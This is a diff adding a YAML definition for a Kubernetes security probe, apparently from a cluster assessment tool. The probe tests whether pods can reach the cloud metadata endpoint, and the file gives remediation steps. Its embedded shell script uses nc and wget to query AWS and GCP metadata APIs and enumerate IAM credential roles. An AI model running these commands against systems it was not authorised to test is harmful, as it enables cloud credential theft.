@@ -1,0 +1,77 @@
+# Technique: Cloud metadata SSRF
+# ID: C5
+# Tactic: Credential Access
+# Probes the cloud metadata endpoint from inside a pod.
+
+id: C5
+name: Cloud metadata SSRF
+enabled: true
+
+mitre:
+  technique_id: T1552
+  technique_name: "Unsecured Credentials"
+  tactic: credential-access
+  data_sources: [Network Traffic, Cloud Service]
+
+cis_controls: []
+
+severity: critical
+
+description: |
+  Tests whether the cloud provider metadata API (169.254.169.254) is
+  reachable from inside a pod. On AWS, GCP, and Azure this endpoint
+  exposes IAM role credentials, instance identity tokens, and project
+  metadata. A successful probe enables lateral movement outside the
+  cluster into the cloud control plane.
+
+execution:
+  mode: exec
+  requires_target_pod: true
+
+  probes:
+    - type: command
+      run: |
+        echo -n "METADATA_CHECK:"
+        if nc -z -w 3 169.254.169.254 80 2>/dev/null; then
+            echo "REACHABLE"
+            # Attempt to identify cloud provider
+            AWS=$(wget -q -O- --timeout=2 http://169.254.169.254/latest/meta-data/ 2>/dev/null)
+            if [ -n "$AWS" ]; then
+                echo "CLOUD_PROVIDER:AWS"
+                ROLE=$(wget -q -O- --timeout=2 \
+                    http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
+                [ -n "$ROLE" ] && echo "IAM_ROLE:$ROLE"
+            fi
+            GCP=$(wget -q -O- --timeout=2 --header="Metadata-Flavor: Google" \
+                http://169.254.169.254/computeMetadata/v1/ 2>/dev/null)
+            if [ -n "$GCP" ]; then
+                echo "CLOUD_PROVIDER:GCP"
+            fi
+        else
+            echo "BLOCKED"
+        fi
+
+  evidence_markers:
+    - marker: "REACHABLE"
+      evidence: "Cloud metadata endpoint (169.254.169.254) is reachable from pod"
+      impact: "Cloud credential theft enables lateral movement outside the cluster"
+    - marker: "IAM_ROLE"
+      evidence: "AWS IAM role discovered via metadata API"
+      impact: "Attacker can assume this IAM role to access AWS services"
+    - marker: "CLOUD_PROVIDER"
+      evidence: "Cloud provider identified via metadata response"
+    - marker: "BLOCKED"
+      evidence: "Cloud metadata endpoint is blocked"
+
+success_indicators:
+  - "REACHABLE"
+
+impact:
+  - "Steal IAM role credentials (AWS) or access tokens (GCP/Azure)"
+  - "Cloud credential theft enables lateral movement outside the cluster"
+  - "Access S3 buckets, RDS databases, or other cloud resources"
+
+remediation: |
+  Add a NetworkPolicy egress rule blocking 169.254.169.254/32.
+  On AWS, enable IMDSv2 with hop limit 1 to prevent container access.
+  On GCP, use Workload Identity instead of node-level metadata.
